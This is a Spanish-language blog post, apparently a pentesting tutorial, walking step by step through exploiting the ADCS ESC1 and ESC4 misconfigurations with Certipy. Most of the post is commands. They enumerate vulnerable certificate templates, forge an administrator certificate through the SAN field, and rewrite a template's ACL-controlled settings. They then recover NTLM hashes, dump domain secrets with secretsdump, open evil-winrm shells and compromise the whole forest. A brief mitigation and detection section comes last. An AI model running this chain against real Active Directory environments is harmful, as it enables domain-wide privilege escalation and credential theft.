---
title: "ADCS ESC1 y ESC4: De Usuario de Dominio a Enterprise Admin"
date: 2026-01-22
tags:
  - active-directory
  - adcs
  - certipy
  - windows
description: Explotación paso a paso de las malas configuraciones ADCS ESC1 y ESC4 usando Certipy — desde la enumeración de plantillas hasta un certificado forjado que te da Enterprise Admin sobre todo el bosque.
---

## Por qué ADCS sigue siendo devastador

Active Directory Certificate Services está desplegado en la mayoría de entornos AD empresariales y casi siempre está mal configurado. Una sola plantilla de certificados vulnerable puede llevarte de cualquier usuario de dominio a Enterprise Admin sin tocar LSASS, sin Kerberoasting y sin disparar la mayoría de reglas de detección.

Will Schroeder y Lee Christensen documentaron esta superficie de ataque en 2021. Tres años después, la mayoría de entornos siguen sin corregirlo.

---

## Requisitos

- Cuenta de usuario de dominio (cualquiera)
- Acceso de red a la CA (`certsrv`, puerto 443 u 80)
- [Certipy](https://github.com/ly4k/Certipy) — `pip install certipy-ad`

---

## Enumeración

```bash
# Encontrar la CA y plantillas vulnerables
certipy find -u 'jdoe@corp.local' -p 'Password123' -dc-ip 10.10.10.1 -stdout

# Exportar para BloodHound
certipy find -u 'jdoe@corp.local' -p 'Password123' -dc-ip 10.10.10.1 -bloodhound
```

Certipy marcará las plantillas con `[!] Vulnerable`. Buscamos específicamente `ESC1`, `ESC4`, `ESC8`.

---

## ESC1: El solicitante provee el Subject Alternative Name

**Condición**: Una plantilla tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado, permite autenticación de dominio y un usuario sin privilegios puede inscribirse.

Esto significa que puedes solicitar un certificado para **cualquier usuario** — incluido el administrador de dominio — especificando su UPN en el campo SAN. La CA lo emitirá sin verificar si realmente eres ese usuario.

```bash
# Solicitar un cert como Administrator
certipy req \
  -u 'jdoe@corp.local' \
  -p 'Password123' \
  -ca 'CORP-CA' \
  -template 'PlantillaVulnerable' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# Output: administrator.pfx
```

Usamos el certificado para obtener un TGT via PKINIT:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

Certipy recupera el TGT **y** el hash NTLM via UnPAC-the-hash. Usamos el hash o el `.ccache` directamente:

```bash
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/administrator@dc01.corp.local
```

---

## ESC4: ACL vulnerable en plantilla de certificado

**Condición**: Un usuario (o grupo) con pocos privilegios tiene derechos `WriteProperty`, `WriteDacl` o `WriteOwner` sobre una plantilla de certificado.

Podemos modificar la plantilla para introducir la vulnerabilidad ESC1 nosotros mismos, explotarla y luego revertir.

```bash
# Paso 1: Verificar quién tiene permisos de escritura
certipy template \
  -u 'jdoe@corp.local' \
  -p 'Password123' \
  -template 'PlantillaCerrada' \
  -dc-ip 10.10.10.1

# Paso 2: Modificar la plantilla (guardar estado anterior con -save-old)
certipy template \
  -u 'jdoe@corp.local' \
  -p 'Password123' \
  -template 'PlantillaCerrada' \
  -save-old \
  -dc-ip 10.10.10.1
```

Tras la modificación, la plantilla ahora tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. Procedemos con el exploit ESC1:

```bash
# Paso 3: Explotar (igual que ESC1)
certipy req \
  -u 'jdoe@corp.local' \
  -p 'Password123' \
  -ca 'CORP-CA' \
  -template 'PlantillaCerrada' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# Paso 4: Restaurar la plantilla original (limpieza)
certipy template \
  -u 'jdoe@corp.local' \
  -p 'Password123' \
  -template 'PlantillaCerrada' \
  -configuration PlantillaCerrada.json \
  -dc-ip 10.10.10.1
```

---

## Del certificado a la shell

Con el TGT o el hash NTLM:

```bash
# Evil-WinRM con pass-the-hash
evil-winrm -i dc01.corp.local -u administrator -H <HASH_NTLM>

# Con ticket Kerberos
KRB5CCNAME=administrator.ccache evil-winrm -i dc01.corp.local -r corp.local
```

---

## Multi-dominio: comprometiendo Enterprise Admin

En bosques multi-dominio, la CA del dominio raíz emite certificados de confianza en todos los dominios hijo. Una vulnerabilidad ESC1 en las plantillas del dominio raíz permite falsificar un certificado para `enterprise admin@rootdomain.local` desde cualquier usuario de un dominio hijo.

```bash
certipy req \
  -u 'jdoe@child.corp.local' \
  -p 'Password123' \
  -ca 'ROOTCORP-CA' \
  -template 'PlantillaVulnerable' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1
```

Este es el escenario de compromiso total del bosque. Una sola plantilla mal configurada, todo el bosque comprometido.

---

## Detección y mitigación

**Mitigación:**
- Deshabilitar `ENROLLEE_SUPPLIES_SUBJECT` en todas las plantillas que no lo necesiten explícitamente
- Auditar las ACL de plantillas — nadie excepto administradores PKI debería tener acceso de escritura
- Habilitar aprobación del CA manager para plantillas de alto privilegio
- Monitorear: `Event ID 4886` (Certificado Solicitado), `4887` (Certificado Emitido)

**Detección:** La enumeración con `certipy find` es ruidosa — autentica y consulta LDAP por atributos de plantillas. La solicitud real (`certipy req`) es más difícil de distinguir de una inscripción legítima.

---

## Recursos

- [Certified Pre-Owned — SpecterOps whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- Certipy by ly4k: [github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
- HTB ProLabs Wutai y Offshore — ambos tienen malas configuraciones de ADCS en el path
